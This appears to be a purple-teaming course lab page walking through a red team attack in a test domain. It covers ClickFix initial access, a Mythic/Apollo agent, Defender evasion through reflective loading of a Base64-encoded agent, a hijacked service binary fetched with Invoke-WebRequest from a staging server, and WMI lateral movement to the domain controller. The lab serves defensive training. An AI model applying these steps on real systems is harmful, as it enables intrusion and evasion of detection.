---
layout: default
title: "Red Team Engage - Lateral Movement"
permalink: /solo-purple-teaming/red-team-engage-lateral-movement/
---

<link rel="stylesheet" href="/assets/css/solo-purple-teaming.css">

<div class="spt-page">
<a class="spt-back" href="/solo-purple-teaming/">← Back to Solo Purple Teaming</a>
<section class="spt-hero">
<p class="spt-kicker">Solo Purple Teaming</p>
<h1>Red Team Engage - Lateral Movement</h1>
</section>
<section class="spt-content">

Owner: Mike Sterrett

## **Overview**

In this exercise, we will:

1. Re-engage Level 1 attack path.
2. Perform initial access using the ClickFix TTP via the Run dialogue.
3. Enumerate services with a custom **Service Scan Utility**.
4. Privilege escalate by bypassing our last detection from the previous lecture.
5. Laterally move to the Domain Controller (DC) using WMI.
6. Validate that no detections are triggered in Wazuh.

---

## **1. Initial Access**

- **TTP Used:** ClickFix via **Run dialogue** to execute a PowerShell command that reflectively loads the Apollo agent.
- **Process:**
    1. Open the **Run box**.
    2. Paste and execute the PowerShell one-liner to load Apollo into memory.
    3. In Mythic, interact with the new callback.
    4. Change the tab description to `Initial Access - Arlen`.

---

## **2. Register Service Scan Utility**

- **Why:** We’ll need it for enumeration without writing to disk.
- **Steps:**
    1. In **Windows RE** session, run:
        
        ```
        register assembly
        
        ```
        
    2. Use the modal to upload `service_scan_demo.exe`.
    3. In Mythic, set **Injection Technique**:
        - `syscall_x64.ntcreatethreadex`
    4. Set **Spawn To**:
        - Use modal → set to `smartscreen`.
    5. Execute the assembly:
        
        ```
        execute assembly service_scan_demo.exe
        
        ```
        
    6. Verify in Wazuh dashboard → no detections.
    7. Check assume breach host → confirm Defender doesn’t flag it.

---

## **3. Enumeration**

- Service scan results reveal the vulnerable service.
- Navigate to target directory:
    
    ```powershell
    cd C:\Users\Arlen\Desktop
    
    ```
    
- Rename existing service binary:
    
    ```powershell
    Rename-Item ecoin_sync.exe ecoin_sync.bak
    ls
    
    ```
    
    Confirm rename was successful.
    

---

## **4. Privilege Escalation & Bypass**

### **Problem from Last Lecture**

- Directly running Apollo from user directories (e.g., Downloads, Desktop) triggered Defender.
- Reflection from these locations was also detected.
- Writing to **`C:\Windows\System32\spool\drivers\color`** was possible but Defender flags `.exe` files here.

### **Bypass Solution**

1. **Encode Apollo Agent:**
    - Open **CyberChef**.
    - Upload Apollo binary → confirm MZ header.
    - Convert to Base64 → save as `apollo.dat`.
2. **Transfer Encoded File:**
    - Use SCP to send `apollo.dat` to staging server.
    - Pull it to the target directory with the agent.
3. **Modify Ecoin Sync Service Binary:**
    - Read `apollo.dat`.
    - Convert Base64 → bytes.
    - Use reflection (`AppDomain.CurrentDomain.Load`) to load and execute the binary from memory.
4. **Deploy:**
    - Build modified service binary.
    - SCP to staging server.
    - Use PowerShell IWR to download:
        
        ```powershell
        Invoke-WebRequest http://192.168.100.101:8000/ecoin_sync.exe -OutFile ecoin_sync.exe
        
        ```
        
    - Start the service (ensure correct name).
    - Verify **new high-integrity callback** as `SVC_ecoin_sync`.

---

## **5. Domain Admin Verification**

- Check group membership:
    
    ```
    shell net user SVC_ecoin_sync /domain
    
    ```
    
- Confirm membership in **Domain Admins**.

---

## **6. Lateral Movement to Domain Controller**

- Identify DC:
    
    ```
    shell nltest /dsgetdc:ecoin
    
    ```
    
- Use **jump wmi** in Mythic:
    
    ```
    jump wmi 10.0.2.2
    
    ```
    
    - Builds Apollo WinExe.
    - Copies to admin share.
    - Executes remotely.
- Interact with the new callback from DC.
- Verify:
    
    ```
    shell hostname
    
    ```
    
    Confirm `ecoin-DC1`.
    

---

## **7. Detection Check**

- Open Wazuh dashboard → verify **no alerts**.
- Success: Bypassed all custom detections.

---

## **8. Student Challenge**

- Recreate the lateral movement to DC **without detection**.
- Find your own bypass for the last detection.
- Prepare for the next lecture where we will **switch to blue team mode** and build new detections for these updated TTPs.

</section>
</div>
